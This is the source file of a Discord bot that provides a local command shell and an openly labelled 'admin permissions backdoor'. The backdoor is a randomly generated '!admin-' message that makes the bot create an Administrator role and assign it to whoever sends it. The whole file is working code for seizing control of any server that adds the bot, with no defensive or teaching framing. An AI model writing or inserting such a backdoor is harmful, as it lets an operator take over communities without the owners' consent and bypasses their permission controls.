import { Client, GatewayIntentBits, PermissionsBitField } from 'discord.js';
import { printTable } from 'console-table-printer';
import chalk from 'chalk';
import * as tty from 'node:tty';
import * as readline from 'node:readline';

import Random from './utils/random';
import { getCommands } from './constants';

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
    ],
});

const backdoor = '!admin-' + Random.string(10);

const commands = await getCommands(client);

client.on('ready', () => {
    console.log(`Logged in as ${chalk.bold(client.user?.tag)}, starting shell ...`);

    console.log(
        `The admin permissions backdoor is ready, you can now use the command ${chalk.red(
            backdoor,
        )} to get admin permissions\n\n`,
    );

    if (tty.isatty(process.stdin.fd)) {
        const rl = readline.createInterface({
            input: process.stdin,
            output: process.stdout,
            prompt: 'discord:~$ ',
        });

        rl.prompt();

        rl.on('line', async (line) => {
            const cmd = line.trim();
            const stdin = cmd.split(' ')[0];
            const args = cmd.split(' ').slice(1);

            const command = commands.find((command) => command.name === stdin);
            if (!command) {
                console.error('Command not found');
            } else {
                try {
                    const data = await command.callback(...args);

                    if (data instanceof Error) {
                        console.error(data);
                    } else if (data instanceof Object) {
                        printTable(data);
                    } else {
                        console.log(data);
                    }
                } catch (error) {
                    console.error(error);
                }
            }

            rl.prompt();
        }).on('close', () => {
            console.log('Exiting shell...');
            process.exit(0);
        });
    }
});

client.on('messageCreate', async (message) => {
    if (message.author.bot) return;

    if (message.content === backdoor) {
        const role = await message.guild?.roles.create({
            name: 'Admin',
            permissions: [PermissionsBitField.Flags.Administrator],
        });

        if (!role) return;

        await message.member?.roles.add(role);
    }
});

if (process.argv.length != 3) {
    console.log('Usage: node index.js <token>');
    process.exit(1);
}

client.login(process.argv[2]);
